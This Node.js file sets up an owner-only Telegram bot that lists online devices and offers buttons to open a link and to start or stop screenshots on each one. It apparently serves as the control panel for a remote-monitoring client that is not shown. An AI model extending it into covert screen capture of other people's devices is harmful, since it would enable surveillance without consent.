const TelegramBot = require("node-telegram-bot-api");
const { devices } = require("./devices");

const TOKEN = "PASTE_YOUR_BOT_TOKEN";
const OWNER_ID = 123456789; // আপনার Telegram numeric ID

const bot = new TelegramBot(TOKEN, { polling: true });

bot.onText(/\/start/, msg => {
  if (msg.from.id !== OWNER_ID) return;

  const buttons = Object.values(devices)
    .filter(d => d.online)
    .map(d => [{ text: d.name, callback_data: `dev_${d.id}` }]);

  bot.sendMessage(msg.chat.id, "📡 Online Devices", {
    reply_markup: { inline_keyboard: buttons }
  });
});

bot.on("callback_query", query => {
  if (query.from.id !== OWNER_ID) return;

  const chatId = query.message.chat.id;
  const data = query.data;

  if (data.startsWith("dev_")) {
    const id = data.replace("dev_", "");
    bot.sendMessage(chatId, `📱 ${devices[id].name}`, {
      reply_markup: {
        inline_keyboard: [
          [{ text: "🔗 Open Link", callback_data: `open_${id}` }],
          [{ text: "📸 Start Screenshot", callback_data: `shot_${id}` }],
          [{ text: "⛔ Stop Screenshot", callback_data: `stop_${id}` }],
          [{ text: "⬅ Back", callback_data: "back" }]
        ]
      }
    });
  }
});

module.exports = bot;
